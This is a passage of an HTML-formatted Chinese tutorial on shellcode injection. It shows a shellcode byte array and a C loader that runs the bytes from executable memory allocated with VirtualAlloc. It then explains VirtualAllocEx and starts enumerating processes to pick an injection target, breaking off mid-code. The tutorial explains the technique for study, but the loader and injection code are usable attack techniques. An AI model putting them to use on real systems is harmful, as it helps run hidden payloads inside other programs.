51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x44</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x55</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x0F</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xB7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x42</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x18</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x3D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x0B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x01</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x04</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x33</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC0</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x32</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x4D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x83</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x79</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x0E</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x77</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x04</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x33</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC0</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x25</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xBA</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x08</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x6B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC2</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x0E</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x4D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xFC</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x83</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x7C</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x01</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x78</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x74</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x09</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF4</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x01</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xEB</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x07</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC7</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF4</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x00</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x45</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xF4</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0x8B</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xE5</span><span style="color: rgb(51, 51, 51);">,</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">0x5D</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0xC3</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">};</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">int</span><span style="color: rgb(51, 51, 51);"> main</span><span style="color: rgb(51, 51, 51);">()</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">{</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    LPVOID lpAddr </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">VirtualAlloc</span><span style="color: rgb(51, 51, 51);">(</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            NULL</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//表示任意地址，随机分配</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            </span><span style="color: rgb(0, 134, 179);">1</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//内存通常是以分页为单位来给空间 1页=4k 4096字节</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            MEM_COMMIT</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//告诉操作系统给分配一块内存</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">            PAGE_EXECUTE_READWRITE</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">if</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">lpAddr </span><span style="color: rgb(51, 51, 51);">==</span><span style="color: rgb(51, 51, 51);"> NULL</span><span style="color: rgb(51, 51, 51);">){</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        printf</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(24, 54, 145);">"Alloc error!"</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">        </span><span style="color: rgb(167, 29, 93);">return</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(51, 51, 51);">}</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(150, 152, 150);">//到这里表示能够成功分配内存</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    memcpy</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> data</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">sizeof</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">data</span><span style="color: rgb(51, 51, 51);">));</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">typedef</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(167, 29, 93);">void</span><span style="color: rgb(51, 51, 51);">(*</span><span style="color: rgb(51, 51, 51);">PFN_FOO</span><span style="color: rgb(51, 51, 51);">)();</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    PFN_FOO f </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">PFN_FOO</span><span style="color: rgb(51, 51, 51);">)(</span><span style="color: rgb(167, 29, 93);">void</span><span style="color: rgb(51, 51, 51);">*)</span><span style="color: rgb(51, 51, 51);">lpAddr</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    f</span><span style="color: rgb(51, 51, 51);">();</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(0, 134, 179);">VirtualFree</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">lpAddr</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(0, 134, 179);">1</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">MEM_DECOMMIT</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    </span><span style="color: rgb(167, 29, 93);">return</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">;</span></span></code></pre></section><p><span style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;">这里我们本地写个messagebox，可以看到helloworld是再常量区地址为0C65858h，但是函数的引用地址却在0C6916Ch，他们之间是有强烈的依赖关系，所以我们如果直接把代码抽出来是无法利用的</span></p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4666666666666667" src="图片/HACK学习呀_2020-11-06_ShellCode注入原理/3_HFmfONIIZ3v5e9Kk1Oicf9IRETn6Eg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9daZbNBsJluBLOgoXDqWME8PCwzQmgdcb30XamZibSV1OyDAHFmfONIIZ3v5e9Kk1Oicf9IRETn6Eg/640?wx_fmt=png'" data-type="png" data-w="1200" style="box-sizing: border-box;margin: 0.1em auto 0.5em;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p><span style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;">所以如果上面我们想要执行成功就要处理掉相关依赖，比如相关函数的地址，字符串地址 自己重定位了，shellcode：一段与地址无关的代码，只要把它放在任意32位程序中只要给他一个起点就能执行 所以我们要先开辟空间然后再写入，然是可以看到VirtualAlloc写了谁调用在谁哪里开辟空间</span></p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.1396103896103896" src="图片/HACK学习呀_2020-11-06_ShellCode注入原理/4_s8FoaEw1qj1NPD3EY2Vlves16wP5jg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9daZbNBsJluBLOgoXDqWMEGdUaaexMNAOFiazia9qia68TthWs8FoaEw1qj1NPD3EY2Vlves16wP5jg/640?wx_fmt=png'" data-type="png" data-w="1232" style="box-sizing: border-box;margin: 0.1em auto 0.5em;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">所以我们就用加强版VirtualAllocEx,它可以在指定进程去开辟&nbsp;<strong style="color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><span style="font-style: italic;">VirtualAllocEx</span></strong></p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">LPVOID </span><span style="color: rgb(0, 134, 179);">VirtualAllocEx</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">  HANDLE hProcess</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">          </span><span style="color: rgb(150, 152, 150);">// process to allocate memory</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  LPVOID lpAddress</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">         </span><span style="color: rgb(150, 152, 150);">// desired starting address </span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  SIZE_T dwSize</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">            </span><span style="color: rgb(150, 152, 150);">// size of region to allocate</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  DWORD flAllocationType</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);">   </span><span style="color: rgb(150, 152, 150);">// type of allocation</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">  DWORD flProtect           </span><span style="color: rgb(150, 152, 150);">// type of access protection);</span></span></code></pre></section><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">代码差不多，但是这里我们要先获取我们要注入的进程句柄，这里shellcode为32位所以我们需要获取的也是32位的</p><section class="code-snippet__github" style="margin: 10px 8px;height: auto;display: flex;font-size:12px;line-height:32px;;background-color: rgba(27, 31, 35, 0.05);color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, system-ui, Roboto, &quot;Helvetica Neue&quot;, sans-serif;text-align: start;white-space: normal;"><pre data-lang="" style="padding: 1em;display: grid;counter-reset: line 0;overflow-x: auto;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(150, 152, 150);">//获取快照</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    HANDLE hSnap </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">CreateToolhelp32Snapshot</span><span style="color: rgb(51, 51, 51);">(</span><span style="color: rgb(51, 51, 51);">TH32CS_SNAPPROCESS</span><span style="color: rgb(51, 51, 51);">,</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span style="color: rgb(51, 51, 51);">);</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    PROCESSENTRY32 pe32</span><span style="color: rgb(51, 51, 51);">;</span></span></code><code style="padding-right: 8px;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(51, 51, 51);">    DWORD pid </span><span style="color: rgb(51, 51, 51);">=</span><span style="color: rgb(51, 51, 51);"> </span><span style="color: rgb(0, 134, 179);">0</span><span 